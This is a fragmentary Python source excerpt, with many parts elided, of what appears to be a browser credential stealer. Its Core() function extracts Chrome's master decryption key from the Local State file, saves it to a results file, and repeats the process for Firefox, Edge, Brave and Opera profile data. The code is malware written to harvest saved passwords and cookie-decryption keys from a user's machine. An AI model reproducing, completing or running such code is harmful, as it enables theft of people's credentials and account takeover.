...
def Core():
    ...
    if bw==1:
        ...
        try:
            master_key=get_master_key(LOCAL_PATH["CHROME_LOCALSTATE_PATH"]);master_key_without_Byte=re.findall("b'(.*?)'",str(master_key))[0];main_db=os.environ['USERPROFILE']+os.sep+r'AppData\Local\Google\Chrome\User Data\default\\'
            with open('Results/Google Chrome/Chrome_MasterKey.txt','a',encoding="utf-8") as f:f.write(str(master_key_without_Byte))
        except FileNotFoundError:console.print('\n[!] Error, Dirctory Not Found { '+f'{LOCAL_PATH["CHROME_LOCALSTATE_PATH"]}'+' }');exit(0)
        ...
        except FileNotFoundError:console.print('\n[!] Error, Dirctory Not Found { '+f'{temp_db}'+' }');exit(0)
        Firefox_Login()
        ...
        except FileNotFoundError:console.print('\n[!] Error, Dirctory Not Found { '+f'{LOCAL_PATH["EDGE_LOCALSTATE_PATH"]}'+' }');exit(0)
        ...
        except FileNotFoundError:console.print('\n[!] Error, Dirctory Not Found { '+f'{LOCAL_PATH["BRAVE_LOCALSTATE_PATH"]}'+' }');exit(0)
        ...
        except FileNotFoundError:console.print('\n[!] Error, Dirctory Not Found { '+f'{LOCAL_PATH["OPERA_LOCALSTATE_PATH"]}'+' }');exit(0)
    ...
    else:console.print(f"[*] ID ( {bw} ) is Not Found ..");exit(5)
